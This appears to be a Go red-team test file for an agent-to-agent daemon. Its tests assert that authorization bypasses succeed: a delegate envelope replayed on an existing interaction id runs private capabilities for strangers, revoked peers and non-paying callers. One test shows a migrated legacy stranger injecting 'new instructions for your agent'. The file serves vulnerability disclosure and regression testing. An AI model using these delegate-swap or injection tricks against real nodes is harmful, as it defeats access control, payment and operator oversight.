package daemon

// si5_redteam_test.go: adversarial PoCs for SI-5 (A2A-DESIGN §1, §5, §6).
// Each test asserts that the ATTACK SUCCEEDS: a passing test means the
// defect is present.

import (
	"context"
	"database/sql"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/ANetResearch/ANetCore/seal"

	"github.com/ANetResearch/ANet/internal/runtime/interactions"
)

// swapDelegate seals a second anet.delegate/1 for an interaction id the
// sender already holds on prov, with a new message id and a TaskDoc that
// calls capID. To the receive pipeline it is "a redelivery of an accepted
// delegation": step 9 re-checks only the deny list, and redeliveredDelegate
// then runs the capability named in THIS envelope's TaskDoc, not the one
// stored for the interaction.
func swapDelegate(t *testing.T, from, prov *Daemon, ix, capID string) rxResult {
	t.Helper()
	body := delegateBody(t, from.self, ix, "anything", capID)
	env := craft(t, senderOf(from), prov, seal.TypeDelegate, ix, body, nil)
	return receive(t, prov, env)
}

// Under policy open a stranger may send natural-language tasks, and a
// capability call from a stranger is refused unless the capability is in
// inbound.public_capabilities (§5.2 row 5). The stranger opens a
// natural-language task, then re-sends a delegate on the same interaction
// id whose TaskDoc calls a capability that is NOT public: it runs.
func TestRedteamSI5_OpenPolicyStrangerRunsNonPublicCapabilityViaDelegateSwap(t *testing.T) {
	srv := newFakeHub(t)
	ctx := context.Background()
	prov := registered(t, srv.URL, "prov")
	stranger := registered(t, srv.URL, "stranger")
	lamp := &lampProvider{}
	if err := prov.Providers().Register(ctx, lamp); err != nil {
		t.Fatal(err)
	}
	setPolicy(t, prov, PolicyOpen) // no public capabilities

	// Control: a direct capability call is refused (row 5).
	gid, err := stranger.DelegateCapability(ctx, prov.AID(), lampCap, map[string]any{"on": true})
	if err != nil {
		t.Fatal(err)
	}
	if err := prov.pollOnce(ctx); err != nil {
		t.Fatal(err)
	}
	if len(lamp.invoked) != 0 {
		t.Fatalf("control: direct non-public call ran")
	}
	if st, meta := lastStatusMeta(t, stranger, gid); st != interactions.StateRejected || meta["anet.reason"] != reasonCapabilityNotPub {
		t.Fatalf("control: %s %v", st, meta)
	}

	// Attack: a natural-language task first, accepted as trust=public ...
	id, err := stranger.Delegate(ctx, prov.AID(), "hello, a harmless question", nil)
	if err != nil {
		t.Fatal(err)
	}
	if err := prov.pollOnce(ctx); err != nil {
		t.Fatal(err)
	}
	ix, err := prov.ix.Get(id)
	if err != nil || ix.Trust != interactions.TrustPublic || ix.IsCapability {
		t.Fatalf("setup: %+v %v", ix, err)
	}
	// ... then a delegate on the same id calling the non-public capability.
	r := swapDelegate(t, stranger, prov, id, lampCap)
	if !r.ack() {
		t.Fatalf("swap delegate: %+v", r)
	}
	waitUntil(t, "the smuggled call", func() bool {
		_, running := prov.running.Load(id)
		return !running
	})
	if len(lamp.invoked) != 1 {
		t.Fatalf("attack failed: lamp invoked %d times", len(lamp.invoked))
	}
	if got := lamp.invoked[0].CallerAID; got != stranger.AID() {
		t.Fatalf("caller %q", got)
	}
	t.Logf("DEFECT: under policy open a stranger ran non-public capability %s (caller %s) on interaction %s",
		lampCap, stranger.AID(), id)
}

// Default policy closed. A peer that was on the allow list opened a
// natural-language task; the operator then takes it off the allow list
// (not onto deny). §5.1 says revocation reaches existing interactions: a
// trust=peer interaction re-checks allow, and indeed the peer's text
// messages are dropped. A delegate envelope on the same interaction id is
// not re-checked, and it runs any capability the node serves.
func TestRedteamSI5_RevokedPeerRunsCapabilityViaDelegateSwap(t *testing.T) {
	srv := newFakeHub(t)
	ctx := context.Background()
	prov := registered(t, srv.URL, "prov")
	peer := registered(t, srv.URL, "peer")
	lamp := &lampProvider{}
	if err := prov.Providers().Register(ctx, lamp); err != nil {
		t.Fatal(err)
	}
	allowPeers(t, prov, peer.AID())
	id, err := peer.Delegate(ctx, prov.AID(), "a normal chat task", nil)
	if err != nil {
		t.Fatal(err)
	}
	if err := prov.pollOnce(ctx); err != nil {
		t.Fatal(err)
	}
	if ix, err := prov.ix.Get(id); err != nil || ix.Trust != interactions.TrustPeer {
		t.Fatalf("setup: %+v %v", ix, err)
	}
	// The operator revokes the peer (removes it from peers.allow).
	if _, err := prov.RemovePeer(peer.AID()); err != nil {
		t.Fatal(err)
	}
	// Control: its text is refused now.
	before := counter(prov, dropNotAllowed)
	msg := craft(t, senderOf(peer), prov, seal.TypeMessage, id, chatBody(t, "still there?", ""), nil)
	if r := receive(t, prov, msg); r.reason != dropNotAllowed || counter(prov, dropNotAllowed) != before+1 {
		t.Fatalf("control: revoked peer's message not refused: %+v", r)
	}
	// Attack.
	if r := swapDelegate(t, peer, prov, id, lampCap); !r.ack() {
		t.Fatalf("swap delegate: %+v", r)
	}
	waitUntil(t, "the smuggled call", func() bool {
		_, running := prov.running.Load(id)
		return !running
	})
	if len(lamp.invoked) != 1 {
		t.Fatalf("attack failed: lamp invoked %d times", len(lamp.invoked))
	}
	t.Logf("DEFECT: a peer removed from peers.allow still ran %s on node %s", lampCap, prov.AID())
}

// Policy closed with one PRICED public capability (the shape of a node that
// sells work, e.g. the official paid demo agent). A stranger calls it
// without paying: the provider quotes and the interaction waits
// (input-required, no receipt). The stranger then re-sends a delegate on
// that interaction id calling a capability that is not public: it runs,
// with no admission (Admit) and no payment.
func TestRedteamSI5_ClosedPricedPublicCapabilityStrangerRunsPrivateCapability(t *testing.T) {
	work := &meteredWork{price: 50}
	_, stranger, prov := paidPair(t, work)
	ctx := context.Background()
	// paidPair's provider accepts the requester by name; make it a stranger.
	if _, err := prov.RemovePeer(stranger.AID()); err != nil {
		t.Fatal(err)
	}
	lamp := &lampProvider{}
	if err := prov.Providers().Register(ctx, lamp); err != nil {
		t.Fatal(err)
	}
	if err := prov.SetPublicCapabilities([]PublicCapability{{ID: "work.do"}}); err != nil {
		t.Fatal(err)
	}
	// Control: the private capability is refused to the stranger.
	gid, err := stranger.DelegateCapability(ctx, prov.AID(), lampCap, map[string]any{"on": true})
	if err != nil {
		t.Fatal(err)
	}
	poll(t, prov)
	if len(lamp.invoked) != 0 {
		t.Fatal("control: private capability ran for a stranger")
	}
	if st, meta := lastStatusMeta(t, stranger, gid); st != interactions.StateRejected || meta["anet.reason"] != reasonNotAccepting {
		t.Fatalf("control: %s %v", st, meta)
	}

	// The stranger asks for the priced public capability and does not pay
	// (its auto_max is the default 0).
	id, err := stranger.DelegateCapability(ctx, prov.AID(), "work.do", map[string]any{"n": 1})
	if err != nil {
		t.Fatal(err)
	}
	poll(t, prov)
	pix := getIX(t, prov, id)
	if pix.Trust != interactions.TrustPublicCap || pix.IsTerminal() || len(pix.Receipt) != 0 || work.invoked.Load() != 0 {
		t.Fatalf("setup: trust %s state %s receipt %d invoked %d", pix.Trust, pix.State, len(pix.Receipt), work.invoked.Load())
	}
	// Attack.
	if r := swapDelegate(t, stranger, prov, id, lampCap); !r.ack() {
		t.Fatalf("swap delegate: %+v", r)
	}
	waitUntil(t, "the smuggled call", func() bool {
		_, running := prov.running.Load(id)
		return !running
	})
	if len(lamp.invoked) != 1 {
		t.Fatalf("attack failed: lamp invoked %d times", len(lamp.invoked))
	}
	if work.invoked.Load() != 0 {
		t.Fatalf("the paid work ran")
	}
	t.Logf("DEFECT: closed node with only priced public capability work.do: stranger %s ran private %s unpaid",
		stranger.AID(), lampCap)
}

// migratedV01Node builds a node upgraded from wire 1, where
// accept_delegations defaulted to true ("anyone may delegate"): a wire-1
// config.json with accept_delegations=true and a wire-1 store holding one
// inbound task from stranger that was accepted under the old default and
// is not finished (status queued). New migrates both: the config to policy
// closed, the row to state working with trust "" (the column default). It
// returns the node, the legacy interaction id and a registered lamp.
func migratedV01Node(t *testing.T, srvURL string, stranger *Daemon) (*Daemon, string, *lampProvider) {
	t.Helper()
	ctx := context.Background()
	root := t.TempDir()
	writeTestConfig(t, root, map[string]any{"control_addr": "127.0.0.1:0", "hub_url": srvURL,
		"accept_delegations": true})
	layout := NewLayout(root)
	if err := os.MkdirAll(layout.InteractionsDir(), 0o700); err != nil {
		t.Fatal(err)
	}
	db, err := sql.Open("sqlite", filepath.Join(layout.InteractionsDir(), "interactions.db"))
	if err != nil {
		t.Fatal(err)
	}
	now := time.Now().UTC().Format(time.RFC3339Nano)
	const legacyIX = "ix_0123456789abcdef0123456789abcdef"
	for _, q := range []string{
		`CREATE TABLE interaction (seq INTEGER PRIMARY KEY AUTOINCREMENT, id TEXT NOT NULL UNIQUE, role TEXT NOT NULL,
		  peer_aid TEXT NOT NULL, goal TEXT NOT NULL, status TEXT NOT NULL, request_cid TEXT NOT NULL DEFAULT '',
		  request_doc BLOB, result_cid TEXT NOT NULL DEFAULT '', result BLOB, receipt BLOB, review BLOB,
		  end_req_by TEXT NOT NULL DEFAULT '', end_acc_by TEXT NOT NULL DEFAULT '',
		  created_at TEXT NOT NULL, updated_at TEXT NOT NULL)`,
		`CREATE TABLE message (seq INTEGER PRIMARY KEY AUTOINCREMENT, interaction_id TEXT NOT NULL,
		  sender_aid TEXT NOT NULL, kind TEXT NOT NULL, body TEXT NOT NULL DEFAULT '', created_at TEXT NOT NULL)`,
	} {
		if _, err := db.Exec(q); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := db.Exec(`INSERT INTO interaction(id,role,peer_aid,goal,status,created_at,updated_at) VALUES(?,?,?,?,?,?,?)`,
		legacyIX, "inbound", stranger.AID(), "old task", "queued", now, now); err != nil {
		t.Fatal(err)
	}
	if _, err := db.Exec(`INSERT INTO message(interaction_id,sender_aid,kind,body,created_at) VALUES(?,?,?,?,?)`,
		legacyIX, stranger.AID(), "text", "old task", now); err != nil {
		t.Fatal(err)
	}
	db.Close()

	prov, err := New(layout)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { prov.Close() })
	prov.stopRelayLoop()
	if err := prov.RegisterWithHub(ctx, srvURL, "prov", nil, ""); err != nil {
		t.Fatal(err)
	}
	lamp := &lampProvider{}
	if err := prov.Providers().Register(ctx, lamp); err != nil {
		t.Fatal(err)
	}
	// What the operator is told: closed, every SI-5 key at its default.
	st, err := ReadPolicy(layout)
	if err != nil {
		t.Fatal(err)
	}
	if _, changed := st.SI5(); len(changed) != 0 || prov.config().inbound().Policy != PolicyClosed {
		t.Fatalf("setup: migrated node not reported safe: %v", changed)
	}
	lix := getIX(t, prov, legacyIX)
	if lix.Trust != "" || lix.IsTerminal() {
		t.Fatalf("setup: migrated row trust %q state %s", lix.Trust, lix.State)
	}
	return prov, legacyIX, lamp
}

// After the migration to closed (doctor: every SI-5 key at its default) a
// stranger whose task was accepted under wire 1's accept-anyone default
// keeps the standing of an allowed peer: no check applies to trust "", so
// its new messages are stored (and reach the operator's agent through
// list_tasks, and the openai auto-reply) while a fresh stranger is refused.
func TestRedteamSI5_MigratedV01StrangerKeepsStandingUnderClosed(t *testing.T) {
	srv := newFakeHub(t)
	ctx := context.Background()
	stranger := registered(t, srv.URL, "stranger")
	fresh := registered(t, srv.URL, "fresh-stranger")
	prov, legacyIX, _ := migratedV01Node(t, srv.URL, stranger)

	// Control: a stranger that was not accepted before is refused.
	if _, err := fresh.Delegate(ctx, prov.AID(), "hi", nil); err != nil {
		t.Fatal(err)
	}
	poll(t, prov)
	if n := counter(prov, dropNotAccepting); n == 0 {
		t.Fatal("control: a fresh stranger was not refused")
	}
	// The legacy stranger's text is taken like an allowed peer's.
	before := countMsgs(t, prov, legacyIX)
	msg := craft(t, senderOf(stranger), prov, seal.TypeMessage, legacyIX, chatBody(t, "new instructions for your agent", "m1"), nil)
	if r := receive(t, prov, msg); !r.ack() || r.reason == dropNotAllowed {
		t.Fatalf("message: %+v", r)
	}
	if got := countMsgs(t, prov, legacyIX); got != before+1 {
		t.Fatalf("attack failed: message not stored (%d -> %d)", before, got)
	}
	t.Logf("DEFECT: after migration to closed (doctor: all SI-5 defaults) a v0.1-accepted stranger still writes into %s", legacyIX)
}

// The same migrated node: the legacy stranger's delegate swap runs a
// capability the node never made public.
func TestRedteamSI5_MigratedV01StrangerRunsCapabilityViaDelegateSwap(t *testing.T) {
	srv := newFakeHub(t)
	stranger := registered(t, srv.URL, "stranger")
	prov, legacyIX, lamp := migratedV01Node(t, srv.URL, stranger)
	if r := swapDelegate(t, stranger, prov, legacyIX, lampCap); !r.ack() {
		t.Fatalf("swap delegate: %+v", r)
	}
	waitUntil(t, "the smuggled call", func() bool {
		_, running := prov.running.Load(legacyIX)
		return !running
	})
	if len(lamp.invoked) != 1 {
		t.Fatalf("attack failed: lamp invoked %d times", len(lamp.invoked))
	}
	t.Logf("DEFECT: migrated closed node ran %s for a v0.1-era stranger", lampCap)
}

// (F9 — SetInboundPolicy put the policy in force before saving it and kept
// it when the save failed — is fixed; its regression test is
// policy_save_test.go.)
